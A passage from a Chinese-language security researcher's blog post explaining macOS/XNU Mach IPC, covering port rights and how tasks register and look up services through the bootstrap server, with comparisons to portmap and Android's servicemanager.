<p>*- 这有点像POSIX的pip(2)系统调用，其创建了两个文件描述符并互相连接。在自己的进程中这样做是无用的，但是当两个文件描述符不在一起的时候，是十分有价值的 - 任意两个线程或进程 - 可以通过它们建立通信。</p>
<p>图 11-2: 第一个Mach消息场景</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/11-2_The first Mach messaging scenario.png" alt="11-2_The first Mach messaging scenario" style="zoom:33%;" />

<p>回顾一下以演示的场景，这里仍然有一个问题需要去考虑。我们先验地假设Alice已经知道了Bob。Alice拥有向Bob的RECEIVE端口SEND的权限。但是，这是一个很难的任务。Alice怎么知道Bob，他们是否以某种方式相互联系？更进一步，如果Alice已经有了一个Bob的SEND权限，并且相应的，Bob也拥有了一个Alice的SEND权限，那么所有这些复杂的交互都是无意义的。</p>
<h3 id="Scenario-2-The-Bootstrap-Server-Registration"><a href="#Scenario-2-The-Bootstrap-Server-Registration" class="headerlink" title="Scenario 2: The Bootstrap Server(Registration)"></a>Scenario 2: The Bootstrap Server(Registration)</h3><p>不存在一个简单的方式能够脱离Alice和Bob的先验性假设。它形成了一个环形的依赖关系，就像鸡和蛋问题，不是轻易能够解决的。相比于直接去击败它，我们可以将它转变为一个公理，将它变成我们的优点。因此有以下公理：</p>
<p><strong>公理4: 存在一个先验的实体，系统上所有的task都拥有对其的SEND权限</strong>。</p>
<p>将这个新的公理付诸实施是一个简单的问题。在对等实体之间无法建立可信联系时，一般会采用一个可信的第三方的方式。一些人喜欢叫这个第三方Trent，另一些人喜欢叫Raymond。而我们将这个实体叫做<strong>bootstrap server</strong>。</p>
<p>现在Alice和Bob的场景将略有不同 - 因为现在不是从Alice开始的，而是从Bob和bootstrap server开始。</p>
<ol>
<li>Bob拥有一个bootstrap server的SEND权限。(公理4)</li>
<li>使用这个权限，Bob能够和bootstrap server建立联系，然后通过简单的场景建立与bootstrap server之间的双向通信。(这是不是必需的，因为Bob可以在建立与server之间的联系之前，先执行下一阶段)</li>
<li>Bob创建一个拥有RECEIVE权限的临时端口。(公理1)</li>
<li>Bob为这个端口创建SEND权限。(公理2)</li>
<li>Bob通过消息将SNED权限发送给bootstrap server(公理3)。这个权限可能会被移动或拷贝(这没有什么问题，因为Bob可以重新创建权限)。</li>
<li>同时在这个消息中，Bob会要求bootstrap server将这个权限与公开的名称相关联起来(如，”com.apple.Bob”)。这被称为bootstrap_register()消息。</li>
</ol>
<p>过了一会儿，Alice出现了：</p>
<ol>
<li>Alice拥有一个bootstrap server的SEND权限。(公理4)</li>
<li>使用这个权限，Alice能够和bootstrap server建立联系，然后通过简单的场景建立与bootstrap server之间的双向通信。</li>
<li>Alice接着向bootstrap server发送一个消息，询问”com.apple.Bob”的位置，或者是其它她想要询问的名字。这被称为一个bootstrap_lookup()消息。</li>
<li>bootstrap server查询是否有人注册了这个名字。如果有(如前所述，Bob注册了)，就意味着，bootstrap server现在可以拷贝SEND权限给那个端口。这将为那个端口创建一个新的SEND权限，并将它传递给Alice。</li>
<li>Alice现在可以和Bob进行对话，按照简单的情况。</li>
</ol>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/11-3_The second messaging scenario.png" alt="11-3_The second messaging scenario" style="zoom: 33%;" />

<p>Bootstrap server对于连接建立来说是一个非常重要的角色，允许对等实体之间定位其他人的位置。用RPC的话来说，这被称为<strong>endpoint mapper</strong> - 接收者可能与SUNRPC的portmap(TCP 111)或Windows臭名昭著的rpcss.exe类似。在Android中，servicemanager进程提供了这个功能，然而那里的底层的传输机制是binder而不是TCP。</p>
<p>通过先验的假设知道所有的bootstrap server解决了在不知晓彼此的对等实体之间建立通信的巨大挑战。尽管这样做的一个明显的缺点是需要更多的信息交换，但在每个server的生命周期中注册消息仅需一次，并且查询消息在会话建立之前也仅需一次 - 所以这个缺点是微不足道的。</p>
<blockquote>
<p>在继续阅读之前，思考一下能否找出bootstrap server的注册消息是否存在其它的安全相关的问题。</p>
</blockquote>
<p>除了缺点之外，使用bootstrap server还是有很多优点的，最重要的是将连接建立集中起来。Bootstrap server可以选择控制连接查询(有益于系统性能)，或者直接拒绝查询特定的client(增强了系统安全性)。但是没有比bootstrap server提供的第二个方法 - Check in - 更大的优点了。</p>
<h3 id="Scenario-3-The-Bootstrap-Server-Check-in"><a href="#Scenario-3-The-Bootstrap-Server-Check-in" class="headerlink" title="Scenario 3: The Bootstrap Server(Check-in)"></a>Scenario 3: The Bootstrap Server(Check-in)</h3></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://avatars.githubusercontent.com/u/19711495?v=4" alt="buffer0verflooow"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">buffer0verflooow</p><p class="is-size-6 is-block">Security Researcher</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Beijing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">56</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">51</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-10T06:23:56.000Z">2022-10-10</time></p><p class="title"><a href="/2022/10/10/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-30T07:29:09.000Z">2022-07-30</time></p><p class="title"><a href="/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">Android安全笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-20T12:35:56.000Z">2022-07-20</time></p><p class="title"><a href="/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Android中间人攻击方法整理</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-04T12:34:01.000Z">2022-07-04</time></p><p class="title"><a href="/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/">Android 11 魔形女漏洞</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-01T13:59:36.000Z">2022-07-01</time></p><p class="title"><a href="/2022/07/01/macOS-Intel%E5%9B%BE%E5%BD%A2%E5%86%85%E6%A0%B8%E6%8B%93%E5%B1%95RCE-EOP/">macOS Intel图形内核拓展RCE+EOP</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">July 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">November 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ASN-1/"><span class="tag">ASN.1</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AppleAVE2/"><span class="tag">AppleAVE2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ContentProvider/"><span class="tag">ContentProvider</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IOServices/"><span class="tag">IOServices</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/LPE/"><span class="tag">LPE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PendingIntent/"><span class="tag">PendingIntent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adobe/"><span class="tag">adobe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/afl/"><span class="tag">afl++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ams/"><span class="tag">ams</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">18</span></a></div><div class="control"><a class="tags has-addons" href="/tags/aosp/"><span class="tag">aosp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/apple/"><span class="tag">apple</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/arm64/"><span class="tag">arm64</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cfprefsd/"><span class="tag">cfprefsd</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/chrome/"><span class="tag">chrome</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/darwin/"><span class="tag">darwin</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/exploit/"><span class="tag">exploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gpu/"><span class="tag">gpu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hook/"><span class="tag">hook</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intel/"><span class="tag">intel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intent/"><span class="tag">intent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iomfb/"><span class="tag">iomfb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ios/"><span class="tag">ios</span><span class="tag">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/logic-vul/"><span class="tag">logic vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/lpe/"><span class="tag">lpe</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mach/"><span class="tag">mach</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/macos/"><span class="tag">macos</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mig/"><span class="tag">mig</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/note/"><span class="tag">note</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/npu/"><span class="tag">npu</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pac/"><span class="tag">pac</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pipe/"><span class="tag">pipe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pongoOS/"><span class="tag">pongoOS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qemu/"><span class="tag">qemu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcom/"><span class="tag">qualcom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcomm/"><span class="tag">qualcomm</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/safari/"><span class="tag">safari</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/samsung/"><span class="tag">samsung</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/soot/"><span class="tag">soot</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/static-analysis/"><span class="tag">static analysis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/syzkaller/"><span class="tag">syzkaller</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tcc/"><span class="tag">tcc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/telecom/"><span class="tag">telecom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/uaf/"><span class="tag">uaf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vul/"><span class="tag">vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/webaudio/"><span class="tag">webaudio</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xnu/"><span class="tag">xnu</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xpc/"><span class="tag">xpc</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 buffer0verflooow</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>